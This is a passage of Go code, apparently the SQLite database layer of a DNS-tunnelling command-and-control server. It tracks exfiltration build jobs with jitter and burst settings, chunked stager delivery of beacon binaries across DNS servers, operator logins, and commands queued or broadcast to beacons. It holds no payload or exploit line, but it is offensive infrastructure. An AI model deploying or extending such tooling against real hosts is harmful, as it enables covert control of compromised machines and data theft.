			architecture = ?,
			chunk_bytes = ?,
			jitter_min_ms = ?,
			jitter_max_ms = ?,
			chunks_per_burst = ?,
			burst_pause_ms = ?,
			server_ip = ?,
			domains = ?,
			resolvers = ?,
			artifact_filename = ?,
			artifact_path = ?,
			artifact_download_path = ?,
			artifact_size = ?,
			updated_at = ?,
			completed_at = ?
		WHERE id = ?
	`,
		status,
		job.Message,
		job.Error,
		job.Platform,
		job.Architecture,
		job.ChunkBytes,
		job.JitterMinMs,
		job.JitterMaxMs,
		job.ChunksPerBurst,
		job.BurstPauseMs,
		job.ServerIP,
		encodeStringSliceJSON(job.Domains),
		encodeStringSliceJSON(job.Resolvers),
		artifactFilename,
		artifactPath,
		artifactDownloadPath,
		artifactSize,
		updated.Unix(),
		completed,
		job.ID,
	)
	if err != nil {
		return err
	}

	if rows, _ := result.RowsAffected(); rows == 0 {
		return d.InsertExfilBuildJob(job)
	}

	return nil
}

func (d *MasterDatabase) GetExfilBuildJob(id string) (*ExfilBuildJob, error) {
	if strings.TrimSpace(id) == "" {
		return nil, fmt.Errorf("job id is required")
	}

	row := d.db.QueryRow(`
		SELECT status, message, error, platform, architecture,
			chunk_bytes, jitter_min_ms, jitter_max_ms, chunks_per_burst,
			burst_pause_ms, server_ip, domains, resolvers,
			artifact_filename, artifact_path, artifact_download_path, artifact_size,
			created_at, updated_at, completed_at
		FROM exfil_build_jobs
		WHERE id = ?
	`, id)

	var job ExfilBuildJob
	job.ID = id
	var domainsJSON, resolversJSON sql.NullString
	var artifactFilename, artifactPath, artifactDownloadPath sql.NullString
	var artifactSize sql.NullInt64
	var createdUnix, updatedUnix int64
	var completedUnix sql.NullInt64

	if err := row.Scan(
		&job.Status,
		&job.Message,
		&job.Error,
		&job.Platform,
		&job.Architecture,
		&job.ChunkBytes,
		&job.JitterMinMs,
		&job.JitterMaxMs,
		&job.ChunksPerBurst,
		&job.BurstPauseMs,
		&job.ServerIP,
		&domainsJSON,
		&resolversJSON,
		&artifactFilename,
		&artifactPath,
		&artifactDownloadPath,
		&artifactSize,
		&createdUnix,
		&updatedUnix,
		&completedUnix,
	); err != nil {
		if err == sql.ErrNoRows {
			return nil, fmt.Errorf("exfil build job not found")
		}
		return nil, err
	}

	job.Domains = decodeStringSliceJSON(domainsJSON.String)
	job.Resolvers = decodeStringSliceJSON(resolversJSON.String)
	job.CreatedAt = time.Unix(createdUnix, 0)
	job.UpdatedAt = time.Unix(updatedUnix, 0)
	if completedUnix.Valid {
		completed := time.Unix(completedUnix.Int64, 0)
		job.CompletedAt = &completed
	}
	if artifactDownloadPath.Valid || artifactFilename.Valid {
		artifact := &BuildArtifact{
			Filename:     artifactFilename.String,
			Type:         "exfil",
			Size:         0,
			DownloadPath: artifactDownloadPath.String,
		}
		if artifactSize.Valid {
			artifact.Size = artifactSize.Int64
		}
		job.Artifact = artifact
	}

	return &job, nil
}

func (d *MasterDatabase) ListExfilBuildJobs(limit, offset int, status string) ([]*ExfilBuildJob, int, error) {
	if limit <= 0 {
		limit = 25
	}
	if limit > 200 {
		limit = 200
	}
	if offset < 0 {
		offset = 0
	}


	args := []interface{}{}
	where := ""
	status = strings.TrimSpace(status)
	if status != "" {
		where = "WHERE status = ?"
		args = append(args, status)
	}

	countQuery := fmt.Sprintf("SELECT COUNT(1) FROM exfil_build_jobs %s", where)
	var total int
	if err := d.db.QueryRow(countQuery, args...).Scan(&total); err != nil {
		return nil, 0, err
	}

	listQuery := fmt.Sprintf(`
		SELECT id, status, message, error, platform, architecture,
			chunk_bytes, jitter_min_ms, jitter_max_ms, chunks_per_burst,
			burst_pause_ms, server_ip, domains, resolvers,
			artifact_filename, artifact_path, artifact_download_path, artifact_size,
			created_at, updated_at, completed_at
		FROM exfil_build_jobs
		%s
		ORDER BY created_at DESC
		LIMIT ? OFFSET ?
	`, where)
	listArgs := append(append([]interface{}{}, args...), limit, offset)
	rows, err := d.db.Query(listQuery, listArgs...)
	if err != nil {
		return nil, 0, err
	}
	defer rows.Close()

	jobs := []*ExfilBuildJob{}
	for rows.Next() {
		var job ExfilBuildJob
		var id string
		var domainsJSON, resolversJSON sql.NullString
		var artifactFilename, artifactPath, artifactDownloadPath sql.NullString
		var artifactSize sql.NullInt64
		var createdUnix, updatedUnix int64
		var completedUnix sql.NullInt64

		if err := rows.Scan(
			&id,
			&job.Status,
			&job.Message,
			&job.Error,
			&job.Platform,
			&job.Architecture,
			&job.ChunkBytes,
			&job.JitterMinMs,
			&job.JitterMaxMs,
			&job.ChunksPerBurst,
			&job.BurstPauseMs,
			&job.ServerIP,
			&domainsJSON,
			&resolversJSON,
			&artifactFilename,
			&artifactPath,
			&artifactDownloadPath,
			&artifactSize,
			&createdUnix,
			&updatedUnix,
			&completedUnix,
		); err != nil {
			return nil, 0, err
		}

		job.ID = id
		job.Domains = decodeStringSliceJSON(domainsJSON.String)
		job.Resolvers = decodeStringSliceJSON(resolversJSON.String)
		job.CreatedAt = time.Unix(createdUnix, 0)
		job.UpdatedAt = time.Unix(updatedUnix, 0)
		if completedUnix.Valid {
			completed := time.Unix(completedUnix.Int64, 0)
			job.CompletedAt = &completed
		}
		if artifactDownloadPath.Valid || artifactFilename.Valid {
			artifact := &BuildArtifact{
				Filename:     artifactFilename.String,
				Type:         "exfil",
				Size:         0,
				DownloadPath: artifactDownloadPath.String,
			}
			if artifactSize.Valid {
				artifact.Size = artifactSize.Int64
			}
			job.Artifact = artifact
		}

		jobs = append(jobs, &job)
	}

	if err := rows.Err(); err != nil {
		return nil, 0, err
	}

	return jobs, total, nil
}

// DeleteClientBinary removes a client binary
func (d *MasterDatabase) DeleteClientBinary(id string) error {

	_, err := d.db.Exec("DELETE FROM client_binaries WHERE id = ?", id)
	return err
}

// Stager Session operations

// CreateStagerSession creates a new stager deployment session
func (d *MasterDatabase) CreateStagerSession(id, stagerIP, os, arch, clientBinaryID, initiatedByDNS string, totalChunks int) error {

	now := time.Now().Unix()

	// Use INSERT OR IGNORE to handle multiple DNS servers reporting same stager
	// With deterministic session IDs, the first DNS server to report creates the session
	_, err := d.db.Exec(`
		INSERT OR IGNORE INTO stager_sessions (id, stager_ip, os, arch, client_binary_id, total_chunks, 
			initiated_by_dns, created_at, last_activity)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
	`, id, stagerIP, os, arch, clientBinaryID, totalChunks, initiatedByDNS, now, now)

	return err
}

// UpsertClientBinary inserts or updates a client binary record (for filesystem-loaded beacons)
func (d *MasterDatabase) UpsertClientBinary(id, filename, os, arch string, originalSize, compressedSize, base64Size, totalChunks int, base64Data, dnsDomains, sha256Checksum string) error {

	now := time.Now().Unix()

	_, err := d.db.Exec(`
		INSERT INTO client_binaries (id, filename, os, arch, original_size, compressed_size, base64_size, 
			chunk_size, total_chunks, base64_data, dns_domains, sha256_checksum, created_at, version)
		VALUES (?, ?, ?, ?, ?, ?, ?, 370, ?, ?, ?, ?, ?, ?)
		ON CONFLICT(id) DO UPDATE SET
			filename = excluded.filename,
			os = excluded.os,
			arch = excluded.arch,
			original_size = excluded.original_size,
			compressed_size = excluded.compressed_size,
			base64_size = excluded.base64_size,
			total_chunks = excluded.total_chunks,
			base64_data = excluded.base64_data,
			dns_domains = excluded.dns_domains,
			sha256_checksum = excluded.sha256_checksum
	`, id, filename, os, arch, originalSize, compressedSize, base64Size, totalChunks, base64Data, dnsDomains, sha256Checksum, now, "filesystem")

	return err
}

// GetStagerSession retrieves a stager session by ID
func (d *MasterDatabase) GetStagerSession(sessionID string) (StagerSession, error) {

	var id, stagerIP, os, arch, clientBinaryID, initiatedByDNS string
	var totalChunks, chunksDelivered, completed int
	var createdAt, lastActivity, completedAt int64

	err := d.db.QueryRow(`
		SELECT id, stager_ip, os, arch, client_binary_id, total_chunks, chunks_delivered,
			initiated_by_dns, created_at, last_activity, completed, completed_at
		FROM stager_sessions
		WHERE id = ?
	`, sessionID).Scan(&id, &stagerIP, &os, &arch, &clientBinaryID, &totalChunks, &chunksDelivered,
		&initiatedByDNS, &createdAt, &lastActivity, &completed, &completedAt)

	if err != nil {
		return StagerSession{}, err
	}

	_ = clientBinaryID // scanned but not in struct

	session := StagerSession{
		ID:              id,
		StagerIP:        stagerIP,
		OS:              os,
		Arch:            arch,
		TotalChunks:     totalChunks,
		ChunksDelivered: chunksDelivered,
		CreatedAt:       createdAt,
		LastActivity:    lastActivity,
		Completed:       completed == 1,
		InitiatedByDNS:  initiatedByDNS,
	}
	if completedAt != 0 {
		session.CompletedAt = &completedAt
	}

	return session, nil
}

// GetCachedChunkCount returns the number of cached chunks for a client binary
func (d *MasterDatabase) GetCachedChunkCount(clientBinaryID string) (int, error) {

	var count int
	// Query client_binaries table for total_chunks metadata
	err := d.db.QueryRow(`
		SELECT total_chunks FROM client_binaries WHERE id = ?
	`, clientBinaryID).Scan(&count)

	if err != nil {
		return 0, fmt.Errorf("client binary %s not found in database", clientBinaryID)
	}

	return count, nil
}

// UpdateStagerSessionActivity updates the last activity timestamp
func (d *MasterDatabase) UpdateStagerSessionActivity(sessionID string) error {

	now := time.Now().Unix()
	_, err := d.db.Exec("UPDATE stager_sessions SET last_activity = ? WHERE id = ?", now, sessionID)
	return err
}

// CompleteStagerSession marks a stager session as completed
func (d *MasterDatabase) CompleteStagerSession(sessionID string) error {

	now := time.Now().Unix()
	_, err := d.db.Exec(`
		UPDATE stager_sessions 
		SET completed = 1, completed_at = ?, chunks_delivered = total_chunks 
		WHERE id = ?
	`, now, sessionID)
	return err
}

// DeleteStagerSession removes a stager session and its chunk assignments
func (d *MasterDatabase) DeleteStagerSession(sessionID string) error {

	// Delete chunk assignments first (in case CASCADE doesn't work)
	_, err := d.db.Exec("DELETE FROM stager_chunk_assignments WHERE session_id = ?", sessionID)
	if err != nil {
		return fmt.Errorf("failed to delete chunk assignments: %w", err)
	}

	// Delete the session
	result, err := d.db.Exec("DELETE FROM stager_sessions WHERE id = ?", sessionID)
	if err != nil {
		return fmt.Errorf("failed to delete stager session: %w", err)
	}

	rows, _ := result.RowsAffected()
	if rows == 0 {
		return fmt.Errorf("stager session not found")
	}

	return nil
}

// UpdateStagerSessionStatus marks a stager session as failed
func (d *MasterDatabase) UpdateStagerSessionStatus(sessionID string, failed bool) error {

	now := time.Now().Unix()
	// We'll add a 'failed' column check, but for now just mark as completed with partial delivery
	if failed {
		_, err := d.db.Exec(`
			UPDATE stager_sessions 
			SET completed = 1, completed_at = ?, last_activity = ?
			WHERE id = ?
		`, now, now, sessionID)
		return err
	}
	return nil
}

// AssignStagerChunks distributes chunks across DNS servers and stores assignments
func (d *MasterDatabase) AssignStagerChunks(sessionID, clientBinaryID string, chunks []string, dnsServers []string) error {

	if len(dnsServers) == 0 {
		return fmt.Errorf("no DNS servers available")
	}

	// Round-robin distribution of chunks across DNS servers
	for i, chunkData := range chunks {
		dnsServerID := dnsServers[i%len(dnsServers)]

		_, err := d.db.Exec(`
			INSERT INTO stager_chunk_assignments (session_id, chunk_index, dns_server_id, chunk_data)
			VALUES (?, ?, ?, ?)
		`, sessionID, i, dnsServerID, chunkData)

		if err != nil {
			return fmt.Errorf("failed to assign chunk %d: %w", i, err)
		}
	}

	return nil
}

// GetStagerChunk retrieves a specific chunk for a stager session
func (d *MasterDatabase) GetStagerChunk(sessionID string, chunkIndex int) (string, string, error) {

	var chunkData, dnsServerID string
	err := d.db.QueryRow(`
		SELECT chunk_data, dns_server_id 
		FROM stager_chunk_assignments 
		WHERE session_id = ? AND chunk_index = ?
	`, sessionID, chunkIndex).Scan(&chunkData, &dnsServerID)

	if err != nil {
		return "", "", err
	}

	return chunkData, dnsServerID, nil
}

// MarkStagerChunkDelivered marks a chunk as delivered (idempotent)
// SHADOW MESH: Handles both pre-assigned chunks AND cache-served chunks
func (d *MasterDatabase) MarkStagerChunkDelivered(sessionID string, chunkIndex int) error {

	now := time.Now().Unix()

	// Check if chunk assignment exists (pre-assigned via Master)
	var alreadyDelivered int
	err := d.db.QueryRow(`
		SELECT delivered FROM stager_chunk_assignments 
		WHERE session_id = ? AND chunk_index = ?
	`, sessionID, chunkIndex).Scan(&alreadyDelivered)

	if err != nil {
		// Chunk assignment doesn't exist - this is a CACHE-SERVED chunk
		// SHADOW MESH: DNS servers serve from cache without pre-assignments
		// We need to track these chunks to show progress in UI!

		// Insert a placeholder record to track this cache-served chunk
		// Use INSERT OR IGNORE to handle race conditions from multiple DNS servers
		result, insertErr := d.db.Exec(`
			INSERT OR IGNORE INTO stager_chunk_assignments 
			(session_id, chunk_index, dns_server_id, chunk_data, delivered, delivered_at)
			VALUES (?, ?, 'cache-served', '', 1, ?)
		`, sessionID, chunkIndex, now)

		if insertErr != nil {
			// Insert error (not a conflict) - just update activity
			d.db.Exec(`UPDATE stager_sessions SET last_activity = ? WHERE id = ?`, now, sessionID)
			return nil
		}

		// Check if row was actually inserted (rowsAffected = 0 means conflict, already exists)
		rowsAffected, _ := result.RowsAffected()
		if rowsAffected == 0 {
			// Chunk already reported by another DNS server
			// STILL update chunks_delivered to track highest chunk index seen (Shadow Mesh fix)
			// This handles case where different DNS servers report different chunks
			_, err = d.db.Exec(`
				UPDATE stager_sessions 
				SET chunks_delivered = MAX(chunks_delivered, ?), last_activity = ?
				WHERE id = ?
			`, chunkIndex+1, now, sessionID)
			return err
		}

		// Successfully inserted new chunk - update chunks_delivered to max(current, chunkIndex+1)
		// Since DNS servers only report every 100th chunk, chunkIndex+1 represents actual progress
		_, err = d.db.Exec(`
			UPDATE stager_sessions 
			SET chunks_delivered = MAX(chunks_delivered, ?), last_activity = ?
			WHERE id = ?
		`, chunkIndex+1, now, sessionID)

		return err
	}

	// Chunk assignment exists - check if already delivered (prevent duplicate counting)
	if alreadyDelivered == 1 {
		// Already delivered - just update activity timestamp
		d.db.Exec(`UPDATE stager_sessions SET last_activity = ? WHERE id = ?`, now, sessionID)
		return nil
	}

	// Mark pre-assigned chunk as delivered (first time)
	_, err = d.db.Exec(`
		UPDATE stager_chunk_assignments 
		SET delivered = 1, delivered_at = ? 
		WHERE session_id = ? AND chunk_index = ?
	`, now, sessionID, chunkIndex)

	if err != nil {
		return err
	}

	// Update session chunks_delivered to max(current, chunkIndex+1)
	// Since DNS servers only report every 100th chunk, chunkIndex+1 represents actual progress
	_, err = d.db.Exec(`
		UPDATE stager_sessions 
		SET chunks_delivered = MAX(chunks_delivered, ?), last_activity = ?
		WHERE id = ?
	`, chunkIndex+1, now, sessionID)

	return err
}

// GetStagerChunksForDNSServer retrieves all chunks assigned to a specific DNS server for a session
func (d *MasterDatabase) GetStagerChunksForDNSServer(sessionID, dnsServerID string) ([]StagerChunkAssignment, error) {

	rows, err := d.db.Query(`
		SELECT chunk_index, chunk_data, delivered, delivered_at
		FROM stager_chunk_assignments
		WHERE session_id = ? AND dns_server_id = ?
		ORDER BY chunk_index
	`, sessionID, dnsServerID)

	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var chunks []StagerChunkAssignment
	for rows.Next() {
		var chunkIndex, delivered int
		var chunkData string
		var deliveredAt sql.NullInt64

		if err := rows.Scan(&chunkIndex, &chunkData, &delivered, &deliveredAt); err != nil {
			continue
		}

		_ = delivered   // scanned but not in struct
		_ = deliveredAt // scanned but not in struct

		chunks = append(chunks, StagerChunkAssignment{
			ChunkIndex: chunkIndex,
			ChunkData:  chunkData,
		})
	}

	return chunks, rows.Err()
}

// GetStagerSessions retrieves all stager sessions
func (d *MasterDatabase) GetStagerSessions(limit int) ([]StagerSession, error) {

	query := `
		SELECT s.id, s.stager_ip, s.os, s.arch, s.total_chunks, s.chunks_delivered,
			s.initiated_by_dns, s.created_at, s.last_activity, s.completed, s.completed_at,
			c.filename, c.version
		FROM stager_sessions s
		LEFT JOIN client_binaries c ON s.client_binary_id = c.id
		ORDER BY s.created_at DESC
	`

	if limit > 0 {
		query += fmt.Sprintf(" LIMIT %d", limit)
	}

	rows, err := d.db.Query(query)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var sessions []StagerSession
	for rows.Next() {
		var id, stagerIP, os, arch string
		var totalChunks, chunksDelivered, completed int
		var createdAt, lastActivity int64
		var initiatedByDNS, filename, version sql.NullString
		var completedAt sql.NullInt64

		err := rows.Scan(&id, &stagerIP, &os, &arch, &totalChunks, &chunksDelivered,
			&initiatedByDNS, &createdAt, &lastActivity, &completed, &completedAt,
			&filename, &version)

		if err != nil {
			continue
		}

		session := StagerSession{
			ID:              id,
			StagerIP:        stagerIP,
			OS:              os,
			Arch:            arch,
			TotalChunks:     totalChunks,
			ChunksDelivered: chunksDelivered,
			CreatedAt:       createdAt,
			LastActivity:    lastActivity,
			Completed:       completed == 1,
		}

		if initiatedByDNS.Valid {
			session.InitiatedByDNS = initiatedByDNS.String
		}
		if completedAt.Valid {
			v := completedAt.Int64
			session.CompletedAt = &v
		}
		if filename.Valid {
			session.ClientFilename = filename.String
		}
		if version.Valid {
			session.ClientVersion = version.String
		}

		sessions = append(sessions, session)
	}

	return sessions, rows.Err()
}

// Operator operations

// CreateOperator creates a new operator account
func (d *MasterDatabase) CreateOperator(id, username, password, role, email string) error {

	// Hash password
	passwordHash, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	if err != nil {
		return fmt.Errorf("failed to hash password: %w", err)
	}

	now := time.Now().Unix()

	_, err = d.db.Exec(`
		INSERT INTO operators (id, username, password_hash, role, email, created_at, is_active)
		VALUES (?, ?, ?, ?, ?, ?, 1)
	`, id, username, string(passwordHash), role, email, now)

	return err
}

// VerifyOperatorCredentials verifies operator login credentials
func (d *MasterDatabase) VerifyOperatorCredentials(username, password string) (string, string, error) {

	var id, passwordHash, role string
	var isActive int

	err := d.db.QueryRow(`
		SELECT id, password_hash, role, is_active FROM operators WHERE username = ?
	`, username).Scan(&id, &passwordHash, &role, &isActive)

	if err != nil {
		if err == sql.ErrNoRows {
			fmt.Printf("[DB] User not found: %s\n", username)
			return "", "", fmt.Errorf("invalid credentials")
		}
		fmt.Printf("[DB] Query error for user %s: %v\n", username, err)
		return "", "", err
	}

	if isActive != 1 {
		fmt.Printf("[DB] Account disabled for user: %s\n", username)
		return "", "", fmt.Errorf("account disabled")
	}

	// Verify password
	err = bcrypt.CompareHashAndPassword([]byte(passwordHash), []byte(password))
	if err != nil {
		fmt.Printf("[DB] Password verification failed for user %s: %v\n", username, err)
		return "", "", fmt.Errorf("invalid credentials")
	}

	// Update login stats
	go func() {
		d.db.Exec(`
			UPDATE operators SET last_login = ?, login_count = login_count + 1 WHERE id = ?
		`, time.Now().Unix(), id)
	}()

	return id, role, nil
}

// GetAllOperators returns all operator accounts
func (d *MasterDatabase) GetAllOperators() ([]Operator, error) {

	rows, err := d.db.Query(`
		SELECT id, username, role, email, created_at, last_login, login_count, is_active
		FROM operators
		ORDER BY created_at DESC
	`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var operators []Operator
	for rows.Next() {
		var id, username, role string
		var email sql.NullString
		var createdAt, loginCount int64
		var lastLogin sql.NullInt64
		var isActive int

		if err := rows.Scan(&id, &username, &role, &email, &createdAt, &lastLogin, &loginCount, &isActive); err != nil {
			continue
		}

		op := Operator{
			ID:         id,
			Username:   username,
			Role:       role,
			Email:      email.String,
			CreatedAt:  time.Unix(createdAt, 0).Format(time.RFC3339),
			LoginCount: loginCount,
			IsActive:   isActive == 1,
		}

		if lastLogin.Valid {
			formatted := time.Unix(lastLogin.Int64, 0).Format(time.RFC3339)
			op.LastLogin = &formatted
		}

		operators = append(operators, op)
	}

	return operators, nil
}

// GetOperator retrieves a single operator by ID
func (d *MasterDatabase) GetOperator(operatorID string) (Operator, error) {

	var id, username, role string
	var email sql.NullString
	var createdAt, loginCount int64
	var lastLogin sql.NullInt64
	var isActive int

	err := d.db.QueryRow(`
		SELECT id, username, role, email, created_at, last_login, login_count, is_active
		FROM operators
		WHERE id = ?
	`, operatorID).Scan(&id, &username, &role, &email, &createdAt, &lastLogin, &loginCount, &isActive)

	if err != nil {
		if err == sql.ErrNoRows {
			return Operator{}, fmt.Errorf("operator not found")
		}
		return Operator{}, err
	}

	op := Operator{
		ID:         id,
		Username:   username,
		Role:       role,
		Email:      email.String,
		CreatedAt:  time.Unix(createdAt, 0).Format(time.RFC3339),
		LoginCount: loginCount,
		IsActive:   isActive == 1,
	}

	if lastLogin.Valid {
		formatted := time.Unix(lastLogin.Int64, 0).Format(time.RFC3339)
		op.LastLogin = &formatted
	}

	return op, nil
}

// UpdateOperator updates operator details (not password)
func (d *MasterDatabase) UpdateOperator(operatorID, username, role, email string) error {

	var setClauses []string
	var args []interface{}

	if username != "" {
		setClauses = append(setClauses, "username = ?")
		args = append(args, username)
	}
	if role != "" {
		setClauses = append(setClauses, "role = ?")
		args = append(args, role)
	}
	if email != "" {
		setClauses = append(setClauses, "email = ?")
		args = append(args, email)
	}

	if len(setClauses) == 0 {
		return nil
	}

	query := fmt.Sprintf("UPDATE operators SET %s WHERE id = ?", strings.Join(setClauses, ", "))
	args = append(args, operatorID)
	_, err := d.db.Exec(query, args...)
	return err
}

// UpdateOperatorPassword changes an operator's password
func (d *MasterDatabase) UpdateOperatorPassword(operatorID, newPassword string) error {

	// Hash new password
	passwordHash, err := bcrypt.GenerateFromPassword([]byte(newPassword), bcrypt.DefaultCost)
	if err != nil {
		return fmt.Errorf("failed to hash password: %w", err)
	}

	_, err = d.db.Exec(`
		UPDATE operators 
		SET password_hash = ?
		WHERE id = ?
	`, string(passwordHash), operatorID)

	return err
}

// SetOperatorActive enables or disables an operator account
func (d *MasterDatabase) SetOperatorActive(operatorID string, active bool) error {

	activeInt := 0
	if active {
		activeInt = 1
	}

	_, err := d.db.Exec(`
		UPDATE operators 
		SET is_active = ?
		WHERE id = ?
	`, activeInt, operatorID)

	return err
}

// DeleteOperator removes an operator account
func (d *MasterDatabase) DeleteOperator(operatorID string) error {

	_, err := d.db.Exec(`DELETE FROM operators WHERE id = ?`, operatorID)
	return err
}

// CheckUsernameExists checks if a username is already taken
func (d *MasterDatabase) CheckUsernameExists(username string) (bool, error) {

	var count int
	err := d.db.QueryRow(`SELECT COUNT(*) FROM operators WHERE username = ?`, username).Scan(&count)
	if err != nil {
		return false, err
	}

	return count > 0, nil
}

// CreateBroadcastTask creates a task for all active beacons
// Used for distributing updates like new DNS server domains
func (d *MasterDatabase) CreateBroadcastTask(command, createdBy string) error {

	// Get all active beacons (seen in last 30 minutes)
	cutoff := time.Now().Add(-30 * time.Minute).Unix()
	rows, err := d.db.Query(`
		SELECT id, dns_server_id 
		FROM beacons 
		WHERE last_seen > ? AND status = 'active'
	`, cutoff)
	if err != nil {
		return fmt.Errorf("failed to get active beacons: %w", err)
	}
	defer rows.Close()

	now := time.Now().Unix()
	created := 0

	// Create a task for each active beacon
	for rows.Next() {
		var beaconID, dnsServerID string
		if err := rows.Scan(&beaconID, &dnsServerID); err != nil {
			continue
		}

		// Generate unique task ID
		taskID := d.generateTaskID()

		// Insert task
		_, err := d.db.Exec(`
			INSERT INTO tasks (id, beacon_id, command, status, assigned_dns_server, created_by, created_at, updated_at)
			VALUES (?, ?, ?, 'pending', ?, ?, ?, ?)
		`, taskID, beaconID, command, dnsServerID, createdBy, now, now)

		if err == nil {
			created++
		}
	}

	if created == 0 {
		return fmt.Errorf("no tasks created (no active beacons)")
	}

	return nil
}

// generateTaskID creates a unique task identifier in TXXXX format
func (d *MasterDatabase) generateTaskID() string {
	n := d.taskCounter.Add(1)
	return fmt.Sprintf("T%04d", n)
}

// GetEnabledDNSDomains returns a list of all enabled DNS domains
func (d *MasterDatabase) GetEnabledDNSDomains() ([]string, error) {

	rows, err := d.db.Query(`
		SELECT domain FROM dns_servers WHERE status = 'active' ORDER BY id
	`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var domains []string
	for rows.Next() {
		var domain string
		if err := rows.Scan(&domain); err != nil {
			continue
		}
		domains = append(domains, domain)
	}

	return domains, rows.Err()
}

// CreateTask creates a new task for a specific beacon
// Task is available to ALL DNS servers until one delivers it
func (d *MasterDatabase) CreateTask(beaconID, command, createdBy string) (string, error) {

	// Verify beacon exists (don't require active status - tasks queue for next checkin)
	var exists int
	err := d.db.QueryRow(`
		SELECT 1 FROM beacons WHERE id = ?
	`, beaconID).Scan(&exists)

	if err != nil {
		if err == sql.ErrNoRows {
			return "", fmt.Errorf("beacon not found")
		}
		return "", fmt.Errorf("failed to get beacon info: %w", err)
	}

	// Generate task ID
	taskID := d.generateTaskID()
	now := time.Now().Unix()

	var createdByVal interface{} = createdBy
	if createdBy == "" {
		createdByVal = nil
	}

	_, err = d.db.Exec(`
		INSERT INTO tasks (id, beacon_id, command, status, created_by, created_at, updated_at)
		VALUES (?, ?, ?, 'pending', ?, ?, ?)
	`, taskID, beaconID, command, createdByVal, now, now)

	if err != nil {
		return "", fmt.Errorf("failed to create task: %w", err)
	}

	return taskID, nil
}

// GetTasksForDNSServer retrieves pending tasks for all active beacons
// SHADOW MESH FIX: Return ALL pending tasks to ALL DNS servers.
// The atomic MarkTaskDelivered() handles deduplication - only one server can claim a task.
// Previous bug: INNER JOIN on beacon_dns_contacts meant new DNS servers wouldn't see tasks
// for beacons that hadn't contacted them yet, breaking Shadow Mesh rotation.
func (d *MasterDatabase) GetTasksForDNSServer(dnsServerID string) ([]DNSServerTask, error) {

	// Return ALL pending tasks for ALL active beacons
	// Shadow Mesh: Any DNS server may deliver any task - MarkTaskDelivered handles deduplication
	// The beacon_dns_contacts join was removed because:
	// 1. New DNS servers wouldn't see tasks for beacons they haven't met yet
	// 2. Beacons rotating via Shadow Mesh could miss tasks stuck on other servers
	rows, err := d.db.Query(`
		SELECT t.id, t.beacon_id, t.command, t.status, t.created_at
		FROM tasks t
		WHERE t.status = 'pending'
		ORDER BY t.created_at ASC
	`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var tasks []DNSServerTask
	for rows.Next() {
		var id, beaconID, command, status string
		var createdAt int64

		if err := rows.Scan(&id, &beaconID, &command, &status, &createdAt); err != nil {
			continue
		}

		_ = createdAt // scanned but not in struct

		tasks = append(tasks, DNSServerTask{
			ID:       id,
			BeaconID: beaconID,
			Command:  command,
			Status:   status,
		})
	}

	return tasks, rows.Err()
}

// GetCompletedTasksForSync retrieves completed/failed/partial tasks for DNS server sync
// This allows DNS servers to clear beacon.CurrentTask when Master completes task reassembly
// migration12AddDNSServerTaskSync creates per-DNS-server sync tracking table.
// Fixes Shadow Mesh root cause: global synced_at meant only the first DNS server
// to check in would get task status updates.
func (d *MasterDatabase) migration12AddDNSServerTaskSync() error {
	_, err := d.db.Exec(`
		CREATE TABLE IF NOT EXISTS dns_server_task_sync (
			dns_server_id TEXT NOT NULL,
			task_id TEXT NOT NULL,
			synced_at INTEGER NOT NULL,
			PRIMARY KEY (dns_server_id, task_id)
		)
	`)
	return err
}

// migration13AddSessionJTIIndex is a no-op — Migration 4 already creates a
// UNIQUE index idx_sessions_jti on sessions(jti). Kept for schema version continuity.
func (d *MasterDatabase) migration13AddSessionJTIIndex() error {
	return nil
}

// migration14AddBeaconName adds beacon_name column to beacons table for operator-assigned labels.
func (d *MasterDatabase) migration14AddBeaconName() error {
	_, err := d.db.Exec(`ALTER TABLE beacons ADD COLUMN beacon_name TEXT DEFAULT ''`)
	return err
}

// migration15AddBeaconDomains creates per-beacon domain tracking table.
func (d *MasterDatabase) migration15AddBeaconDomains() error {
	_, err := d.db.Exec(`
		CREATE TABLE IF NOT EXISTS beacon_domains (
			beacon_id TEXT NOT NULL,
			domain TEXT NOT NULL,
			active INTEGER DEFAULT 1,
			added_at INTEGER NOT NULL,
			PRIMARY KEY (beacon_id, domain),
			FOREIGN KEY (beacon_id) REFERENCES beacons(id) ON DELETE CASCADE
		)
	`)
	return err
}

// migration16AddBeaconFormatEncoding adds payload_format and encoding columns to beacons
// so Shadow Mesh can sync decorator format and encoding mode across all DNS servers.
func (d *MasterDatabase) migration16AddBeaconFormatEncoding() error {
	_, err := d.db.Exec(`ALTER TABLE beacons ADD COLUMN payload_format TEXT DEFAULT ''`)
	if err != nil {
		return err
	}
	_, err = d.db.Exec(`ALTER TABLE beacons ADD COLUMN encoding TEXT DEFAULT ''`)
	return err
}

func (d *MasterDatabase) migration17AddBuildIDSupport() error {
	_, err := d.db.Exec(`ALTER TABLE client_binaries ADD COLUMN build_id TEXT`)
	if err != nil {
		return err
	}
	_, err = d.db.Exec(`ALTER TABLE client_binaries ADD COLUMN build_config TEXT DEFAULT ''`)
	if err != nil {
		return err
	}
	_, err = d.db.Exec(`ALTER TABLE beacons ADD COLUMN build_id TEXT DEFAULT ''`)
	if err != nil {
		return err
	}
	_, err = d.db.Exec(`CREATE UNIQUE INDEX IF NOT EXISTS idx_client_binaries_build_id ON client_binaries(build_id)`)
	if err != nil {
		return err
	}
	_, err = d.db.Exec(`CREATE INDEX IF NOT EXISTS idx_beacons_build_id ON beacons(build_id)`)
	return err
}

func (d *MasterDatabase) migration18AddRegistrationStage() error {
	_, err := d.db.Exec(`ALTER TABLE beacons ADD COLUMN registration_stage INTEGER DEFAULT NULL`)
	return err
}

// GetBeaconDomains returns domains for a beacon. Seeds from beacon_dns_contacts if no entries exist.
func (d *MasterDatabase) GetBeaconDomains(beaconID string) ([]BeaconDomain, error) {
	// Use a single write lock for the check-and-seed to avoid a gap between
	// RUnlock and Lock where another goroutine could race.
	var count int
	d.db.QueryRow(`SELECT COUNT(*) FROM beacon_domains WHERE beacon_id = ?`, beaconID).Scan(&count)
	if count == 0 {
		now := time.Now().Unix()
		d.db.Exec(`
			INSERT OR IGNORE INTO beacon_domains (beacon_id, domain, active, added_at)
			SELECT DISTINCT ?, bdc.dns_domain, 1, ?
			FROM beacon_dns_contacts bdc
